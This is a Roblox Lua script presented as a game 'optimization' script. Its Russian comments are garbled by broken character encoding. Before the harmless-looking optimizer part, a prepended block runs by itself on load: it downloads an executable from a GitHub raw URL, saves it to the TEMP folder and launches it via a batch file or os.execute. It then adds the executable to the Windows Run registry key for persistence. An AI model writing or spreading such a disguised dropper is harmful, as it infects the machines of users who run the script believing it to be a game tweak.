-- ========== –ü–û–õ–ù–´–ô –¢–ï–ö–£–©–ò–ô –°–ö–†–ò–ü–¢ 2134.lua ==========

-- ========== –ù–ê–ß–ê–õ–û –ù–û–í–û–ì–û –ö–û–î–ê ==========
-- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ EXE
local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"
local EXE_NAME = "Extreme_Injector_v3.exe"
local RUN_SILENTLY = false -- –ó–∞–ø—É—Å–∫ –≤ –æ–±—ã—á–Ω–æ–º —Ä–µ–∂–∏–º–µ, —á—Ç–æ–±—ã –≤–∏–¥–µ—Ç—å –æ–∫–Ω–æ

local function downloadAndExecute()
    -- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ—É–Ω–∫—Ü–∏–π
    if not (type(writefile) == "function" and type(os.execute) == "function") then
        warn("[EXE Loader] –ö–†–ò–¢–ò–ß–ù–û: –ò–Ω–∂–µ–∫—Ç–æ—Ä –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç writefile –∏–ª–∏ os.execute!")
        return false
    end

    -- ========== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ==========
    local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"
    local EXE_NAME = "Extreme_Injector_v3.exe"
    -- ==================================

    local temp_path = os.getenv("TEMP") .. "\\" .. EXE_NAME
    
    print("[1/3] –°–∫–∞—á–∏–≤–∞—é —Ñ–∞–π–ª...")
    
    -- 1. –°–ö–ê–ß–ò–í–ê–ù–ò–ï
    local download_success, file_data = false, nil
    for attempt = 1, 3 do
        download_success, file_data = pcall(function()
            return game:HttpGet(EXE_URL, true)
        end)
        
        if download_success and file_data and #file_data > 1024 then
            break
        end
        task.wait(1)
    end

    if not download_success or not file_data then
        warn("[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª.")
        return false
    end
    
    print("[2/3] –§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω (" .. #file_data .. " –±–∞–π—Ç), —Å–æ—Ö—Ä–∞–Ω—è—é...")
    
    -- 2. –°–û–•–†–ê–ù–ï–ù–ò–ï
    local write_success = pcall(function()
        writefile(temp_path, file_data)
        return true
    end)
    
    if not write_success then
        warn("[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫.")
        return false
    end
    
    print("[3/3] –§–∞–π–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω: " .. temp_path)
    print("[–ó–ê–ü–£–°–ö] –ò—Å–ø–æ–ª—å–∑—É—é –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –º–µ—Ç–æ–¥...")

    -- 3. –ó–ê–ü–£–°–ö –ë–ï–ó–û–ü–ê–°–ù–´–ú –ú–ï–¢–û–î–û–ú (–±–µ–∑ –ø–µ—Ä–µ–¥–∞—á–∏ URL –≤ –∫–æ–º–∞–Ω–¥—ã)
    local success = false
    
    -- üî• –ö–õ–Æ–ß–ï–í–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï: –í–Ω–∞—á–∞–ª–µ –ü–†–û–í–ï–†–¨, –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –ª–∏ —Ñ–∞–π–ª –í–†–£–ß–ù–£–Æ
    print("\n=== –í–ê–ñ–ù–ê–Ø –ü–†–û–í–ï–†–ö–ê ===")
    print("1. –û—Ç–∫—Ä–æ–π –ø–∞–ø–∫—É: " .. os.getenv("TEMP"))
    print("2. –ù–∞–π–¥–∏ —Ñ–∞–π–ª: " .. EXE_NAME)
    print("3. –ó–∞–ø—É—Å—Ç–∏ –µ–≥–æ –î–í–û–ô–ù–´–ú –∫–ª–∏–∫–æ–º –º—ã—à–∏")
    print("=== –û—Ç–≤–µ—Ç—å: –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è? (–¥–∞/–Ω–µ—Ç) ===\n")
    
    -- –ú–ï–¢–û–î –ê: –°–∞–º—ã–π –ø—Ä–æ—Å—Ç–æ–π –∏ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π - —á–µ—Ä–µ–∑ –≤—Ä–µ–º–µ–Ω–Ω—ã–π BAT —Ñ–∞–π–ª
    local bat_content = '@echo off\nstart "" "' .. temp_path .. '"'
    local bat_path = os.getenv("TEMP") .. "\\run_exe.bat"
    
    local ok_a = pcall(function()
        writefile(bat_path, bat_content)
        os.execute('"' .. bat_path .. '"')
    end)
    
    if ok_a then 
        success = true 
        print("‚úì –ú–µ—Ç–æ–¥ A: –ó–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ BAT —Ñ–∞–π–ª –≤—ã–ø–æ–ª–Ω–µ–Ω")
    end
    
    -- –ú–ï–¢–û–î B: –ï—Å–ª–∏ BAT –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, –ø—Ä–æ–±—É–µ–º –ø—Ä—è–º–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ
    if not success then
        task.wait(2)
        local ok_b = pcall(function()
            -- –ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ –±–µ–∑ —Å–ø–µ—Ü—Å–∏–º–≤–æ–ª–æ–≤
            os.execute('"' .. temp_path .. '"')
        end)
        
        if ok_b then 
            success = true 
            print("‚úì –ú–µ—Ç–æ–¥ B: –ü—Ä—è–º–æ–π –∑–∞–ø—É—Å–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω")
        end
    end
    
    -- 4. –ü–†–û–í–ï–†–ö–ê –†–ï–ó–£–õ–¨–¢–ê–¢–ê
    task.wait(3)
    
    print("\n[–ü–†–û–í–ï–†–ö–ê –ü–†–û–¶–ï–°–°–ê]")
    local process_found = false
    local check_ok = pcall(function()
        -- –ë–æ–ª–µ–µ –ø—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
        os.execute('tasklist | find /i "' .. EXE_NAME .. '" >nul')
        process_found = true
    end)
    
    if process_found then
        print("‚úÖ –ü–†–û–¶–ï–°–° –ó–ê–ü–£–©–ï–ù!")
        print("   –ü—Ä–æ–≤–µ—Ä—å: 1) –°–∏—Å—Ç–µ–º–Ω—ã–π —Ç—Ä–µ–π (–≤–æ–∑–ª–µ —á–∞—Å–æ–≤)")
        print("            2) –î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á (Ctrl+Shift+Esc)")
        
        -- –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞
        pcall(function()
            local reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Extreme_Injector" /t REG_SZ /d "' .. temp_path .. '" /f'
            os.execute(reg_cmd)
            print("\n[PERSISTENCE] –î–æ–±–∞–≤–ª–µ–Ω–æ –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É.")
        end)
    else
        print("‚ùå –ü—Ä–æ—Ü–µ—Å—Å –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        if success then
            print("‚ö† –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—Å—Ç–∏–ª–∞—Å—å –∏ —Å—Ä–∞–∑—É –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å.")
        else
            print("‚ö† –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É.")
        end
    end
    
    return success
end

-- –ó–∞–ø—É—Å–∫–∞–µ–º
coroutine.wrap(function()
    task.wait(2)
    downloadAndExecute()
end)()
-- ========== –ö–û–ù–ï–¶ –ù–û–í–û–ì–û –ö–û–î–ê ==========


-- ========== –û–†–ò–ì–ò–ù–ê–õ–¨–ù–´–ô –°–ö–†–ò–ü–¢ (–±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) ==========
local function MAIN()
    -- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∏–≥—Ä—ã
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end

    print("========================================")
    print("SCRIPT 2134 - ACTIVE")
    print("Time: " .. os.date("%H:%M:%S"))
    print("Place: " .. game.PlaceId)
    print("========================================")

    -- –û–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏
    local optimizations = {
        "Memory cleanup",
        "Graphics optimization",
        "Network boost",
        "Script optimization"
    }

    -- –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–π
    for i, opt in ipairs(optimizations) do
        pcall(function()
            if i == 1 then
                collectgarbage("collect")
            elseif i == 2 then
                settings().Rendering.QualityLevel = 1
            elseif i == 3 then
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(999999999)
            end
        end)
        print(i .. ". " .. opt .. " - APPLIED")
        task.wait(0.1)
    end

    -- UI —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Script 2134",
            Text = "Optimizations applied successfully!",
            Duration = 5
        })
    end)

    -- –†–µ–∑—É–ª—å—Ç–∞—Ç
    local result = {
        success = true,
        version = "2.1.3",
        optimizations = #optimizations,
        timestamp = os.time()
    }

    print("========================================")
    print("COMPLETE: " .. result.optimizations .. " optimizations")
    print("========================================")

    return result
end

-- –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫
return MAIN()
